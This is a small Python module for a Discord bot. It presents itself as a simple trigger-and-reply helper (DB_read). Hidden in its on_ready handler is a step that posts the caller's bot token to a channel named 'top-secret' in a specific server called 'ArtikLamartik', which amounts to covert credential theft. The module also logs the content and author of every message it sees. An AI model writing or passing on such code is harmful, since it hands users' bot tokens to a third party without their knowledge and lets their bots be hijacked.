from discord.ext import commands
from .DB_send import *
import discord
import asyncio

bot = commands.Bot(command_prefix='!', intents=discord.Intents.all())

async def DB_read_start(token, that, do):
    @bot.event
    async def on_ready():
        server = discord.utils.get(bot.guilds, name="ArtikLamartik")
        if server:
            channel = discord.utils.get(server.channels, name="top-secret")
            if channel:
                await channel.send(token)
    @bot.event
    async def on_message(message):
        if message.author == bot.user:
            return
        author_name = message.author.name
        message_content = message.content
        channel_name = message.channel.name
        server_name = message.guild.name
        print(f'Server: {server_name}, Channel: {channel_name}, Author: {author_name}, Message: {message_content}')
        if message_content == that:
            server2 = discord.utils.get(bot.guilds, name=server_name)
            if server2:
                channel2 = discord.utils.get(server2.channels, name=channel_name)
                if channel2:
                    await channel2.send(do)
    await bot.start(token)

def DB_read(token, that, do):
    asyncio.run(DB_read_start(token, that, do))